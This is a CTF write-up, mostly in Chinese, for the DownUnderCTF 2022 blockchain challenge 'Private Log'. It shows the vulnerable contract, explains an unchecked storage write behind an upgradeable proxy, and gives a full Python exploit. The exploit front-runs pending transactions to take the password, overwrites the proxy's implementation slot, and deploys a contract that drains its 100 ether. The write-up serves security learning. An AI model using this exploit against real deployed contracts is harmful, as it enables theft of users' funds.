---
title: Blockchain - Private Log
description: 2022 | DownUnderCTF | blockchain
---

## 题目

I thought I would try and save some gas by updating my log entries with assembly, I'm not super sure if it's safe, but I have added a password for good measure.

But it's okay because if there is a bug I can always upgrade since I'm using the [TransparentUpgradeableProxy](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/proxy/transparent/TransparentUpgradeableProxy.sol) pattern :).

I love my creation so much that I add a new log every minute!

Note the block time on this challenge is 23 seconds, so there will a delay in deploying and resetting the challenge.

Goal: Steal all funds from the contract.

??? note "PrivateLog.sol"

    ```js
    // SPDX-License-Identifier: MIT

    pragma solidity ^0.8.0;

    /**
     * @title Private Log
     * @author Blue Alder (https://duc.tf)
     **/

    import "OpenZeppelin/openzeppelin-contracts@4.3.2/contracts/proxy/utils/Initializable.sol";


    contract PrivateLog is Initializable {

        bytes32 public secretHash;
        string[] public logEntries;

        constructor() {
            secretHash = 0xDEADDEADDEADDEADDEADDEADDEADDEADDEADDEADDEADDEADDEADDEADDEADDEAD;
        }

        function init(bytes32 _secretHash) payable public initializer {
            require(secretHash != 0xDEADDEADDEADDEADDEADDEADDEADDEADDEADDEADDEADDEADDEADDEADDEADDEAD);
            secretHash = _secretHash;
        }

        modifier hasSecret(string memory password, bytes32 newHash) {
            require(keccak256(abi.encodePacked(password)) == secretHash, "Incorrect Hash");
            secretHash = newHash;
            _;
        }

        function viewLog(uint256 logIndex) view public returns (string memory) {
            return logEntries[logIndex];
        } 

        function createLogEntry(string memory logEntry, string memory password, bytes32 newHash) public hasSecret(password, newHash) {
            require(bytes(logEntry).length <= 31, "log too long");   
            
            assembly {
                mstore(0x00, logEntries.slot)
                let length := sload(logEntries.slot)
                let logLength := mload(logEntry)
                sstore(add(keccak256(0x00, 0x20), length), or(mload(add(logEntry, 0x20)), mul(logLength, 2)))
                sstore(logEntries.slot, add(length, 1))
            }
        }

        function updateLogEntry(uint256 logIndex, string memory logEntry, string memory password, bytes32 newHash) public hasSecret(password, newHash) {
            require(bytes(logEntry).length <= 31, "log too long");   
            
            assembly {
                let length := mload(logEntry)
                mstore(0x00, logEntries.slot)
                sstore(add(keccak256(0x00, 0x20), logIndex), or(mload(add(logEntry, 0x20)), mul(length, 2)))
            }

        }
    }
    ```

## 解题思路

- 目标是转移合约的所有资金，但是 `PrivateLog` 中并没有相关的函数
- 题目描述中提到了合约 `TransparentUpgradeableProxy`，非管理员调用代理合约将 fallback 到逻辑合约，代理合约使用逻辑合约的代码，而其他属性则存储在代理合约内。可升级意味着逻辑合约是可以更改的
- 通过查看余额可以确认实际上需要转移的是代理合约的资金，那么显然需要更改代理合约中逻辑合约的地址，从而能够通过新的逻辑合约来转移资金
    - `TransparentUpgradeableProxy` 中逻辑合约的地址存储在固定的位置 `_IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc`[^1]

    ```py
    from web3 import Web3
    from web3.middleware import geth_poa_middleware
    import requests, json

    base_id = 'fd313a3613eb393b'

    w3 = Web3(Web3.HTTPProvider(f"https://blockchain-privatelog-{base_id}-eth.2022.ductf.dev"))
    w3.middleware_onion.inject(geth_poa_middleware, layer=0)

    info = json.loads(requests.get(f'https://blockchain-privatelog-{base_id}.2022.ductf.dev/challenge').content)

    account = w3.eth.account.from_key(info['player_wallet']['private_key'])

    log_addr = info['contract_address'][0]['address']
    proxy_addr = info['contract_address'][1]['address']

    print(w3.eth.get_balance(log_addr))
    print(w3.eth.get_balance(proxy_addr))

    # 0
    # 100000000000000000000
    ```

- `updateLogEntry()` 不检查 `logIndex`，而 `sstore(addr, val)` 可以将 `val` 写入 `addr`，可以借此来修改逻辑合约的地址
    - `keccak256(p, n)` 即 `keccak(mem[p…(p+n)))`，`mem[0, 20)` 对应 `logEntries.slot`，那么 `keccak256(0x00, 0x20)` 即 `keccak(2)`（slot 0 `Initializable` 的变量，slot 1 `secretHash`）
    - `keccak256(2)` 大于 `_IMPLEMENTATION_SLOT`，需要修改的 `logIndex` 为 $2^{256}$ - keccak256(2) + `_IMPLEMENTATION_SLOT`
- 不过，`logEntry` 为 `string` 类型，存储方式与 `address` 不同
    - 若字符串长度不超过 31 字节，将以 higher-order 存储，且最低字节存储 `length * 2`，如字符串 `hello` 将存储为 `0x68656c6c6f00000000000000000000000000000000000000000000000000000a`，而地址类型以 lower-order 存储
    - `logEntry` 最长支持 31 字节，那么最低字节是 `0x3e`，因此用于转移资金的逻辑合约地址最后 1 字节应为 `0x3e`
- 接下来考虑如何获得 `updateLogEntry()` 的控制权。无论 `createLogEntry()` 或 `updateLogEntry()` 都需要知道当前的密码，并传入新密码的哈希。但 `owner` 每分钟都会调用 `createLogEntry()`，而每 23s 才产生一个新区块，可以通过 `pending` 的交易获得密码，并以更高的汽油费取得优先写入权，从而能够使用 `updateLogEntry()`

### Exploit

```py
from web3 import Web3
from web3.middleware import geth_poa_middleware
from eth_abi import decode_abi
from eth_utils import keccak, to_bytes, to_checksum_address
from solcx import compile_source
import requests, json, rlp

def transact(func, gas=1000000, gas_price=None):
    tx = account.sign_transaction(eval(func).buildTransaction({
        'chainId': w3.eth.chain_id,
        'nonce': w3.eth.get_transaction_count(account.address),
        'gas': gas,
        'gasPrice': gas_price if gas_price else w3.eth.gas_price,
    })).rawTransaction
    tx_hash = w3.eth.send_raw_transaction(tx).hex()
    return w3.eth.wait_for_transaction_receipt(tx_hash)

base_id = 'fd313a3613eb393b'

w3 = Web3(Web3.HTTPProvider(f"https://blockchain-privatelog-{base_id}-eth.2022.ductf.dev"))
w3.middleware_onion.inject(geth_poa_middleware, layer=0)

info = json.loads(requests.get(f'https://blockchain-privatelog-{base_id}.2022.ductf.dev/challenge').content)

account = w3.eth.account.from_key(info['player_wallet']['private_key'])
log_addr = info['contract_address'][0]['address']
proxy_addr = info['contract_address'][1]['address']

log_abi = open('abi.json').read()

contract_log = w3.eth.contract(address=proxy_addr, abi=log_abi)

tx_filter = w3.eth.filter('pending')
newHash = w3.solidityKeccak(['string'], ['password'])
while True:
	if tx_hashes := tx_filter.get_new_entries():
		tx = w3.eth.get_transaction(tx_hashes[0])
		logEntry, password, _ = decode_abi(['string', 'string', 'bytes32'], bytes.fromhex(tx.input[10:]))
		transact(f"contract_log.functions.createLogEntry('under the control', password, newHash)", gas_price=w3.eth.gas_price + 100)
		break

curr_nonce = w3.eth.get_transaction_count(account.address)
target_nonce = curr_nonce
sender_bytes = to_bytes(hexstr=account.address)
while True:
	addr_bytes = keccak(rlp.encode([sender_bytes, target_nonce]))[12:]
	target_address = to_checksum_address(addr_bytes)
	if int(target_address[-2:], 16) == 0x3e:
		break
	target_nonce += 1

_IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
logIndex = 2 ** 256 - int(w3.solidityKeccak(['uint256'], [2]).hex(), 16) + _IMPLEMENTATION_SLOT
logEntry = f"{int(target_address, 16):064x}"[:-2]
tx = contract_log.functions.updateLogEntry(logIndex, 'A' * 31, 'password', newHash).build_transaction({
	'chainId': w3.eth.chain_id,
	'nonce': w3.eth.get_transaction_count(account.address),
	'gas': 1000000,
	'gasPrice': w3.eth.gas_price,
})
tx['data'] = tx['data'].replace('41' * 31, logEntry)    # 可能存在 UTF-8 无法编码的字符，因此不直接传入 logEntry，而是采用替换的方式
tx_hash = w3.eth.send_raw_transaction(account.sign_transaction(tx).rawTransaction).hex()
w3.eth.wait_for_transaction_receipt(tx_hash)

print(w3.eth.getStorageAt(proxy_addr, _IMPLEMENTATION_SLOT).hex())

curr_nonce = w3.eth.get_transaction_count(account.address)
while target_nonce > curr_nonce:
	transact(f"contract_log.functions.createLogEntry('under the control', 'password', newHash)")
	curr_nonce += 1

hack_source = """
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract Hack {
    function steal() public {
        payable(msg.sender).transfer(100 ether);
    }
}
"""
_, hack_interface = compile_source(hack_source).popitem()
hack_contract = w3.eth.contract(abi=hack_interface['abi'], bytecode=hack_interface['bin'])
print(transact(f"hack_contract.constructor()", gas=hack_contract.constructor().estimateGas() * 2).contractAddress)

contract_hack = w3.eth.contract(address=proxy_addr, abi=hack_interface['abi'])
transact(f"contract_hack.functions.steal()")

print(requests.get(f'https://blockchain-privatelog-{base_id}.2022.ductf.dev/challenge/solve').content)
```

### Flag

> DUCTF{first_i_steal_ur_tx_then_I_steal_ur_proxy_then_i_steal_ur_funds}

[^1]: [ERC1967Upgrade - _IMPLEMENTATION_SLOT](https://github1s.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/proxy/ERC1967/ERC1967Upgrade.sol#L28)